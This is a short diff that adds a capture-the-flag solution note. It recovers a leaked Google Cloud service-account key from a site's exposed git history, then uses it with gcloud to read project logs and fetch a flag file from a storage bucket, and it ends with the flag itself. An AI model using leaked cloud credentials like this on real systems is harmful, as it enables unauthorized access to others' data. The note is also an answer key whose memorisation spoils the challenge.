@@ -1,0 +1,10 @@
+dump git on site and recover json in history (did not do this part)
+
+gcloud auth activate-service-account --key-file booming-cosine-304921-5327fdaff786.json
+
+gcloud config set project booming-cosine-304921
+gcloud logging read | grep -i flag
+
+https://storage.googleapis.com/shout-into-void/1574AB2CB00533975094D87814BCF8FA707FD608-flag.txt
+
+CTF{Aud1t_th3_l0g5}
